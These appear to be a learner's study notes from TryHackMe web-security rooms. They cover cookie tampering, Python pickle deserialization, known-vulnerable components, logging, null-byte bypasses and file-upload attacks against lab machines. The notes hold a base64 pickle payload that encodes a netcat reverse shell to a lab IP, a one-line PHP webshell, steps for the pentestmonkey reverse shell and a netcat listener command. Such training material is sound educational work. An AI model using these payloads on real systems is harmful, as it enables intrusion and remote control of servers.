<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image120.jpg"></figure>
<p>&nbsp;</p>
<p>Whilst plaintext credentials is a vulnerability in itself, it is not insecure deserialization as we have not sent any serialized data to be executed!</p>
<p>Cookies are not permanent storage solutions like databases. Some cookies such as session ID's will clear when the browser is closed, others, however, last considerably longer. This is determined by the "Expiry" timer that is set when the cookie is created.</p>
<p>&nbsp;</p>
<p><i>Some cookies have additional attributes, a small list of these are below:</i></p>
<figure class="table" style="width:784.5pt;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">Attribute</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">Description</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">Required?</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Cookie Name</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">The Name of the Cookie to be set</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Yes</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Cookie Value</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Value, this can be anything plaintext or encoded&nbsp;</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Yes</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Secure Only</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">If set, this cookie will only be set over HTTPS connections</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">No</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Expiry</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Set a timestamp where the cookie will be removed from the browser</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">No</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Path</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">The cookie will only be sent if the specified URL is within the request</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">No</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>&nbsp;</p>
<p>Creating Cookies</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image122.png"></figure>
<p><br><br>&nbsp;</p>
<p>Cookies can be set in various website programming languages. For example, Javascript,&nbsp;PHP&nbsp;or Python to name a few. The following web application is developed using Python's Flask, so it is fitting to use it as an example.</p>
<p><i>Take the snippet below:</i></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image124.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Setting cookies in Flask is rather trivial. Simply, this snippet gets the current date and time, stores it within the variable "timestamp" and then stores the date and time in a cookie named "registrationTimestamp". This is what it will look like in the browser.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image126.jpg"></figure>
<p><i>It's as simple as that.</i></p>
<p>&nbsp;</p>
<p>In the browser of the device that you are connected to the VPN with, navigate to http://<strong>MACHINE_IP.</strong>&nbsp;I will be detailing the steps for Firefox - you may have to research how to inspect cookies in the browser of your choice.&nbsp;You will be greeted with the home page:</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image128.jpg" alt="Afbeelding met tekst, buiten, sneeuw, berg

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p><i>Let's create an account. No need to enter your TryHackMe details, you can enter what you like.</i></p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image130.jpg"></figure>
<p>&nbsp;</p>
<p><i>Where you will be directed to your profile page. Notice on the right, you have your details.</i></p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image132.jpg"></figure>
<p>&nbsp;</p>
<p>Right-Click the Page and press "Inspect Element". Navigate to the "Storage" tab.</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image134.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p><strong>Inspecting Encoded Data</strong></p>
<p>You will see here that there are cookies are both plaintext encoded and base64 encoded. The first flag will be found in one of these cookies.</p>
<p>&nbsp;</p>
<p><strong>Modifying Cookie Values</strong></p>
<p>Notice here that you have a cookie named "userType". You are currently a user, as confirmed by your information on the "myprofile" page.</p>
<p>&nbsp;</p>
<p>This application determines what you can and cannot see by your userType. What if you wanted to be come an admin?</p>
<p>&nbsp;</p>
<p>Double left-click the "Value" column of "userType" to modify the contents. Let's change our userType to "admin" and navigate to http://<strong>MACHINE_IP/admin</strong>&nbsp;to answer the second flag.</p>
<p>&nbsp;</p>
<p><strong>Code execution</strong></p>
<p>&nbsp;</p>
<p>A much more nefarious attack than simply decoding cookies, we get into the nitty-gritty.</p>
<p><strong>Setup</strong></p>
<p>1. First, change the value of the userType cookie from "admin" to "user" and return to&nbsp;<a href="http://machine_ip/myprofile">http://MACHINE_IP/myprofile</a><strong>&nbsp;</strong></p>
<p>2. Then, left-click on the URL in "Exhange your vim" found in the screenshot below.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image136.jpg"></figure>
<p>3. Once you have done this, left-click on the URL in "Provide your feedback!" where you will be direct to page like so:</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image137.png"></figure>
<p>.<strong>What makes this form vulnerable?</strong></p>
<p>If a user was to enter their feedback, the data will get encoded and sent to the Flask application (presumably for storage within a database for example). However, the application assumes that any data encoded is trustworthy. But we're hackers. You can only trust us as far as you can fling us (and that's nigh-on impossible online)</p>
<p>Although explaining programming is a bit out of scope for this room, it's important to understand what's going on in the snippet below:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image139.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p>When you visit the "Exchange your vim" URL, A cookie is encoded and stored within your browser - perfect for us to modify! Once you visit the feedback form, the value of this cookie is decoded and then deserialised. Uh oh. In the snippet below, we can see how the cookie is retrieved and then deserialized via&nbsp;<code>pickle.loads</code></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image141.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>This vulnerability exploits Python Pickle, which I have attached as reading material at the end of the room. We essentially have free reign to execute whatever we like such as a reverse shell.<br><br><br>&nbsp;</p>
<p><strong>The Exploit</strong></p>
<p>Now I'm not going to leave you hanging dry here. First, we need to set up a netcat listener on our Kali. If you are a subscriber, you can control your own&nbsp;<a href="https://tryhackme.com/my-machine">in-browser TryHackMe Kali Machine</a>.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image143.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed. I will be detailing the steps below with provided material to do so.</p>
<p>Once this is complete,&nbsp;<a href="https://assets.tryhackme.com/additional/cmn-owasptopten/pickleme.py">copy-and-paste the source code from this python file (pickelme.py)</a>&nbsp;to your kali and modify the source code to replace your "YOUR_TRYHACKME_VPN_IP" with your TryHackMe VPN IP.&nbsp;<a href="https://tryhackme.com/access">This can be obtained via the Access page</a>.</p>
<p>&nbsp;</p>
<p>1. Create a python file to paste into, I have used "rce.py" for these examples:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image145.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p>2. Paste the code from the GitHub site, replacing YOUR_TRYHACKME_VPN_IP with your TryHackMe VPN IP from the access page</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image147.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>3. Execute "rce.py" via&nbsp;<code>python3 rce.py</code></p>
<p>4. Note the output of the command, it will look something similar to this:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image149.jpg"></figure>
<p>&nbsp;</p>
<p>5. Copy and paste everything&nbsp;<strong>in-between the two speech marks</strong>&nbsp;('DATA'). In my case, I will copy and paste:</p>
<p><code>gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTEuMy4yIDQ0NDQgPiAvdG1wL2aUhZRSlC4=</code>&nbsp; &nbsp; Yours may look slightly different, just ensure that you copy everything in-between the two speech marks&nbsp;<code>''</code></p>
<p>&nbsp;</p>
<p>6. Paste this into the "encodedPayload" cookie in your browser:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image151.jpg"></figure>
<p>&nbsp;</p>
<p>7. Ensure our netcat listener is still running:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image143.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>8. Refresh the page. It will hang, refer back to your netcat listener:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image153.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!</p>
<p>&nbsp;</p>
<h2>Components with known vulnerabilities</h2>
<p>Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.</p>
<p>For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on&nbsp;<a href="https://www.exploit-db.com/exploits/41962">exploit-db</a>.</p>
<p>As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.</p>
<p>Hence, why OWASP has rated this a 3(meaning high) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.</p>
<p>&nbsp;</p>
<p>Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software, and research it until we can find an exploit.&nbsp;Let's go through that with an example web application.</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image155.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><i>Nostromo 1.9.6</i></p>
<p>What do you know, this server is using the default page for the nostromo web server. Now that we have a version number and a software name, we can use&nbsp;<a href="https://www.exploit-db.com/">exploit-db</a>&nbsp;to try and find an exploit for this particular version.</p>
<p>(Note: exploit-db is incredibly useful, and for all you beginners you're gonna be using this&nbsp;<strong>a lot&nbsp;</strong>so it's best to get comfortable with it)</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image157.jpg"></figure>
<p>Lucky us, the top result happens to be an exploit script. Let's download it and try and to get code execution. Running this script on it's own actually teaches us a very important lesson.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image159.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>It may not work the first time. It helps to have an understanding of the programming language that the script is in, so that if needed you can fix any bugs or make any modifications, as quite a few scripts on exploit-db expect you to make modifications.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image161.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Fortunately for us, the error was caused by an line that should have been commented, so it's an easy fix.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image163.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>&nbsp;</p>
<p>Fixing that, let's try and run the program again.</p>
<p>Boom! We have RCE. Now it's important to note here that most scripts will just tell you what arguments you need to provide, exploit developers will rarely make you read potentially hundreds of lines of codes just to figure out how to use the script.</p>
<p>It is also worth noting that it may not always be this easy, sometimes you will just be given a version number like in this case, but other times you may need to dig through the HTML source, or even take a lucky guess on an exploit script, but realistically if it is a known vulnerability, there's probably a way to discover what version the application is running.</p>
<p>That's really it, the great thing about this piece of the OWASP 10, is that the work is pretty much already done for us, we just need to do some basic research, and as a penetration tester, you're already doing that quite a bit :).</p>
<p>&nbsp;</p>
<h2>Insufficient logging and reporting</h2>
<p>When web applications are set up, every action performed by the user should be logged. Logging is important because in the event of an incident, the attackers actions can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications. The bigger impacts of these include:</p>
<p>regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.</p>
<p>risk of further attacks: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.</p>
<p>The information stored in logs should include:</p>
<p>HTTP&nbsp;status codes</p>
<p>Time Stamps</p>
<p>Usernames</p>
<p>API endpoints/page locations</p>
<p>IP addresses</p>
<p>These logs do have some sensitive information on them so its important to ensure that logs are stored securely and multiple copies of these logs are stored at different locations.</p>
<p>As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is having monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity includes:</p>
<p>multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources e.g. admin pages)</p>
<p>requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.</p>
<p>use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.</p>
<p>common payloads: in web applications, it's common for attackers to use Cross Site Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.</p>
<p>Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will higher impact than others. These higher impact actions need to be responded to sooner thus they should raise an alarm which raises the attention of the relevant party.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2>&nbsp;</h2>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h1>Default bypasses</h1>
<h2>NULL byte in filenames</h2>
<p>Question #3:&nbsp;Download the Backup file!</p>
<p>We will now go back to the&nbsp;&nbsp;<a href="http://machine_ip/ftp/">http://MACHINE_IP/ftp/</a>&nbsp;folder and try to download&nbsp;package.json.bak. But it seems we are met with a 403 which says that only .md and .pdf files can be downloaded.&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image165.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><br><br>&nbsp;</p>
<p>To get around this, we will use a character bypass called "Poison Null Byte". A&nbsp;Poison Null Byte looks like this:&nbsp;<i>%00</i>.&nbsp;</p>
<p>Note: as we can download it using the&nbsp;<u>url</u>, we will need to encode this into a&nbsp;<u>url encoded format.</u></p>
<p>The&nbsp;Poison Null Byte will now look like this:&nbsp;<i>%2500.&nbsp;</i>Adding this and then a&nbsp;.md&nbsp;to the end will bypass the 403 error!</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image167.png"></figure>
<p>Why does this work?&nbsp;</p>
<p>A&nbsp;Poison Null Byte is actually a&nbsp;NULL terminator.&nbsp;By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string.&nbsp;</p>
<h2>&nbsp;</h2>
<h1>File writing</h1>
<p>When files are uploaded to the server, a range of checks should be carried out to ensure that the file will not overwrite anything which already exists on the server. Common practice is to assign the file with a new name -- often either random, or with the date and time of upload added to the start or end of the original filename. Alternatively, checks may be applied to see if the filename already exists on the server; if a file with the same name already exists then the server will return an error message asking the user to pick a different file name. File permissions also come into play when protecting existing files from being overwritten. Web pages, for example, should not be writeable to the web user, thus preventing them from being overwritten with a malicious version uploaded by an attacker.</p>
<p>If, however, no such precautions are taken, then we might potentially be able to overwrite existing files on the server. Realistically speaking, the chances are that file permissions on the server will prevent this from being a serious vulnerability. That said, it could still be quite the nuisance, and is worth keeping an eye out for in a pentest or bug hunting environment.<br><br>&nbsp;</p>
<p>Let's go through an example before you try this for yourself.&nbsp;<i>Please note that&nbsp;</i>demo.uploadvulns.thm<i>&nbsp;will be used for all demonstrations; however,&nbsp;<strong>this site is not available in the uploaded&nbsp;VM</strong>. It is purely for demonstrative purposes.</i></p>
<p>In the following image we have a web page with an upload form:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image169.png" alt="Afbeelding met tekst, hond, schermafbeelding

Automatisch gegenereerde beschrijving"></figure>
<p>You may need to enumerate more than this for a real challenge; however, in this instance, let's just take a look at the source code of the page:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image171.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Inside the red box, we see the code that's responsible for displaying the image that we saw on the page. It's being sourced from a file called "spaniel.jpg", inside a directory called "images".</p>
<p>Now we know where the image is being pulled from -- can we overwrite it?</p>
<p>Let's download another image from the internet and call it&nbsp;spaniel.jpg. We'll then upload it to the site and see if we can overwrite the existing image:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image173.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image174.png" alt="Afbeelding met tekst, hond, binnen, schermafbeelding

Automatisch gegenereerde beschrijving"></figure>
<p>And our attack was successful! We managed to overwrite the original&nbsp;images/spaniel.jpg&nbsp;with our own copy.</p>
<p>&nbsp;</p>
<h2>RCE and remote shells</h2>
<p>It's all well and good overwriting files that exist on the server. That's a nuisance to the person maintaining the site, and may lead to some vulnerabilities, but let's go further; let's go for RCE!</p>
<p>Remote Code Execution (as the name suggests) would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low-privileged web user account (such as&nbsp;<code>www-data</code>&nbsp;on&nbsp;Linux&nbsp;servers), it's still an extremely serious vulnerability. Remote code execution through a web application tends to be a result of uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute). Traditionally this would be PHP, however, in more recent times, other back-end languages have become more common (Python Django and Javascript in the form of Node.js being prime examples).</p>
<p>There are two basic ways to achieve RCE on a webserver: webshells, and reverse shells. Realistically a fully featured reverse shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads). We'll take a look at each of these in turn. As a general methodology, we would be looking to upload a shell of one kind or another, then activating it, either by navigating directly to the file if the server allows it, or by otherwise forcing the webapp to run the script for us.</p>
<hr>
<p><i><u>Web shells:</u></i></p>
<p>Let's assume that we've found a webpage with an upload form:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image176.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Where do we go from here? Well, let's start with a gobuster scan:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image178.png"></figure>
<p>Looks like we've got two directories here --&nbsp;<code>uploads</code>&nbsp;and&nbsp;<code>assets</code>. Of these, it seems likely that any files we upload will be placed in the "uploads" directory. We'll try uploading a legitimate image file first. Here I am choosing our cute dog photo from the previous task:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image180.png" alt="Afbeelding met tekst, schermafbeelding, monitor

Automatisch gegenereerde beschrijving"></figure>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image182.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Now, if we go to&nbsp;<code>http://demo.uploadvulns.thm/uploads</code>&nbsp;we should see that the spaniel picture has been uploaded!</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image184.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image186.png" alt="Afbeelding met tekst, hond, binnen, staren

Automatisch gegenereerde beschrijving"></figure>
<p>Ok, we can upload images. Let's try a webshell now.</p>
<p>As it is, we know that this webserver is running with a&nbsp;PHP&nbsp;back-end, so we'll skip straight to creating and uploading the shell. In real life, we may need to do a little more enumeration; however, PHP is a good place to start regardless.</p>
<p>A simple webshell works by taking a parameter and executing it as a system command. In&nbsp;PHP, the syntax for this would be:</p>
<p><code>&lt;?php</code><br><code>&nbsp; &nbsp; echo system($_GET["cmd"]);</code><br><code>?&gt;</code>&nbsp;&nbsp;&nbsp;</p>
<p>This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.</p>
<p>Let's try uploading it to the site, then using it to show our current user and the contents of the current directory:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image188.png"></figure>
<p>Success!</p>
<p>We could now use this shell to read files from the system, or upgrade from here to a reverse shell. Now that we have RCE, the options are limitless. Note that when using webshells, it's usually easier to view the output by looking at the source code of the page.&nbsp;This drastically improves the formatting of the output.</p>
<hr>
<p><i><u>Reverse Shells:</u></i></p>
<p>The process for uploading a reverse shell is almost identical to that of uploading a webshell, so this section will be shorter. We'll be using the ubiquitous Pentest Monkey reverse shell, which comes by default on Kali&nbsp;Linux, but can also be downloaded&nbsp;<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">here</a>. You will need to edit line 49 of the shell. It will currently say&nbsp;<code>$ip = '127.0.0.1';&nbsp; // CHANGE THIS</code><br>&nbsp;-- as it instructs, change&nbsp;<code>127.0.0.1</code>&nbsp;to your TryHackMe tun0 IP address, which can be found on the&nbsp;<a href="https://tryhackme.com/access">access page</a>. You can ignore the following line, which also asks to be changed. With the shell edited, the next thing we need to do is start a Netcat listener to receive the connection.&nbsp;<code>nc -lvnp 1234</code>:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image190.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Now, let's upload the shell, then activate it by navigating to&nbsp;<code>http://demo.uploadvulns.thm/uploads/shell.php</code>. The name of the shell will obviously be whatever you called it (<code>php-reverse-shell.php</code>&nbsp;by default).</p>
<p>The website should hang and not load properly -- however, if we switch back to our terminal, we have a hit!</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image192.png"></figure>
<p>Once again, we have obtained RCE on this webserver. From here we would want to stabilise our shell and escalate our privileges, but those are tasks for another time.&nbsp;</p>
<p>&nbsp;</p>
<h3>Client Side Filtering</h3>
<p>Up until now we have largely been ignoring the counter-defences employed by web developers to defend against file upload vulnerabilities. Every website that you've successfully attacked so far in this room has been completely insecure. It's time that changed. From here on out, we'll be looking at some of the defence mechanisms used to prevent malicious file uploads, and how to circumvent them.</p>
<hr>
<p>First up, let's discuss the differences between&nbsp;<i>client</i>-side filtering and&nbsp;<i>server</i>-side filtering.</p>
<p>When we talk about a script being "Client-Side", in the context of web applications, we mean that it's running in the user's browser as opposed to on the web server itself. JavaScript is pretty much ubiquitous as the client-side scripting language, although alternatives do exist.&nbsp; Regardless of the language being used, a client-side script will be run in your web browser. In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server. Theoretically, this would seem like a good thing, right? In an ideal world, it would be; however, because the filtering is happening on&nbsp;<i>our</i>&nbsp;computer, it is trivially easy to bypass. As such client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.</p>
<p>Conversely, as you may have guessed, a&nbsp;<i>server</i>-side script will be run on the server. Traditionally&nbsp;PHP&nbsp;was the predominant server-side language (with Microsoft's ASP for IIS coming in close second); however, in recent years, other options (C#, Node.js, Python, Ruby on Rails, and a variety of others) have become more widely used. Server-side filtering tends to be more difficult to bypass, as you don't have the code in front of you. As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.</p>
<hr>
<p>With that in mind, let's take a look at some different kinds of filtering.</p>
<p><i><u>Extension Validation:</u></i></p>
